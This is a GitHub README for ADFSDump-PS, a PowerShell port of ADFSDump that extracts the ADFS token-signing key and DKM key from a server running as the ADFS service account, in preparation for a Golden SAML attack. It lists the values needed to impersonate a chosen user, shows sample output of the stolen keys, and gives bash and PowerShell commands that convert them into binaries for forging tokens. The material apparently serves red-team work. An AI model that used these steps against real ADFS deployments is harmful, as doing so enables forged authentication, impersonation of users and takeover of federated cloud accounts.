# ADFSDump-PS
I can't take credit for the hard work done in building [ADFSDump](https://github.com/mandiant/ADFSDump) but this is a PowerShell port of it using native functions. 

## Pre-Reqs
In certain conditions, you might need the SqlServer PS module:
- Install-Module -Name SqlServer
Note: Tests on an ADFS server installation with WID in October 2024 were possible without the SqlServer module.

You'll also need the following values for the GoldenSAML attack:
```
User Email/UPN - User to be impersonated
User ObjectGUID - Respective GUID for said user to be impersonated
DKM Key - Gathered using this script
TKS Key - Gathered using this script
Domain - Domain as seen by STS/ADFS/O365
```

## Usage 
To execute this you'll need to be running in the context of the ADFS Service account and on the server where ADFS Lives. 

```
.\Golden.ps1
Encrypted Token Signing Key: <Base64blob>
Certificate value: <certificate value>
Store location value: <StoreLocation>
Store name value: <StoreName>
DKM Key: <DKMKeyValue>
Domain is: example.zsec.uk
```

![image](https://github.com/ZephrFish/ADFSDump-PS/assets/5783068/9594365d-918d-4be5-b44e-ea9ac1e04a35)


If you want to do GoldenSAML, you'll need to do our conversion in the final few steps. Once you've got both the encrypted blob and the DKM key from the script, you'll need to run the following to convert them:
- `cat TKSKey.txt | base64 -d > TKSKey.bin`
- `cat DKM.txt | tr -d "-" | xxd -r -p > DKM.bin`
I'll link these two together later but save the DKM to DKM.txt and the encrytped b64 blob to TKSKey.txt, the PS will do the rest :).

For doing the same with PowerShell:    
```powershell
#TKSKey:
[IO.File]::WriteAllBytes("<PathToTKSKey>.bin", [Convert]::FromBase64String([IO.File]::ReadAllText("<PathToTKSKeyOutputFromScript>.txt")))
#DKMKey:
$content = Get-Content "<PathToDKMKeyOutputFromScript>.txt"
$cleanedContent = $content -replace "-"
$byteArray = for ($i = 0; $i -lt $cleanedContent.Length; $i += 2) {
    [Convert]::ToByte($cleanedContent.Substring($i, 2), 16)
}
[IO.File]::WriteAllBytes("<PathToDKMKey>.bin", $byteArray)
```
